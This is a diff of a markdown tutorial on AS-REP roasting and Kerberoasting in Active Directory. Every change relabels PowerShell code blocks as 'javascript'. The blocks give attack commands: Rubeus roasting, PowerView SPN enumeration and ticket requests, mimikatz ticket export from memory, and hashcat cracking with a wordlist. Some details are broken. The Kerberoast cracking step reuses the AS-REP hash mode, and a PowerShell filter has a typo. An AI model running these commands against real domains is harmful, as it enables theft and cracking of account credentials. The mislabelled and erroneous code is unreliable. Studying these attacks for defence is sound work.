@@ -57,13 +57,13 @@ This results in any user who has the correct name of that account to be able to 
 
 We can use [Rubeus](https://github.com/GhostPack/Rubeus) on a domain joined machine to find all accounts on that domain where **Do not require Kerberos preauthentication** is set and have it return the corresponding hashes. The **/format** option will directly give us output that is crackable with [hashcat](https://github.com/hashcat/hashcat).
 
-```powershell
+```javascript
 Rubeus.exe asreproast /format:hashcat
 ```
 
 The AS-REP hash can then be fed into hashcat for offline attacks i.e. with brute-force or wordlist attacks.
 
-```powershell
+```javascript
 hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
 ```
 
@@ -72,13 +72,13 @@ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
 
 To check which accounts in you environment have pre-authentication disabled, you can use the following powershell cmdlet, which should be available by default on domain joined machines:
 
-```powershell
+```javascript
 get-aduser -filter * -properties DoesNotRequirePreAuth | where {$._DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name
 ```
 
 Or you might want to run [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) in your powershell session and issue the Get-DomainUser cmdlet:
 
-```powershell
+```javascript
 Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
 ```
 
@@ -109,20 +109,20 @@ The attacker can intercept or extract the ticket from memory, and crack the hash
 **Rubeus**  
 The following attack will try to roast all users on the current domain leaving us with hashes in a crackable format for hashcat:  
 
-```powershell
+```javascript
 Rubeus.exe kerberoast /format:hashcat
 ```
 
 **PowerView**  
 We can get a list of all user accounts that have a **SPN** set:  
 
-```powershell
+```javascript
 Get-DomainUser -SPN
 ```
 
 Afterwards we can fetch the hashes like so:  
 
-```powershell
+```javascript
 Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat
 ```
 
@@ -131,19 +131,19 @@ mimikatz can be used to extract **STs** from memory. But beforehand you will hav
 Having a look at the PowerView section above we are already able to query the desired **SPNs**.  
 Next step is to query for the **ST** which can be done with two lines of powershell:
 
-```powershell
+```javascript
 Add-Type –AssemblyName System.IdentityModel  
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘<SPN-name>:<SPN-port>’
 ```
 
 In order to extract the ticket from memory we use mimikatz: 
-```powershell
+```javascript
 kerberos::list /export
 ```
 
 **hashcat**  
 The output from Rubeus and PowerView can directly be feeded into hashcat:  
-```powershell
+```javascript
 hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
 ```
 
